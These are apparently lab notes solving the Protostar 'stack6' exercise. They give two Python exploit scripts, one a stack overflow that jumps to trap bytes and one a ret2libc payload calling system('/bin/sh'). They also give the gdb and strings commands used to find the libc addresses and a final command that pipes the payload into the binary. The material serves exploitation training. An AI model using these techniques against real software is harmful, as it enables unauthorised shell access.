exploit1
--------

import struct

padding = "0000AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
eip = struct.pack("I", 0xbffff7c0+32)   # Here jump to stack
ret = struct.pack("I", 0x080484f9)

trap = "\xcc"*100

print padding + ret + eip + trap

-----------------------------------------------

strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"  ->  11f3bf

gdb ./stack6
r
info proc map
/lib/libc.so -> 0xb7e97000

x/s 0xb7e97000+0x11f3bf -> 0xb7fb63bf  (bin_sh)

exploit2
---------
import struct

padding = "0000AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"

system = struct.pack("I", 0xb7ecffb0)  # In gdb, by "p system"
return_after_system = "AAAA"
bin_sh = struct.pack("I", 0xb7fb63bf)
 
print padding + system + return_after_system + bin_sh
----------------------------------------------------------------

Final command -> (python exploit2.py; cat) | /opt/protostar/bin/stack6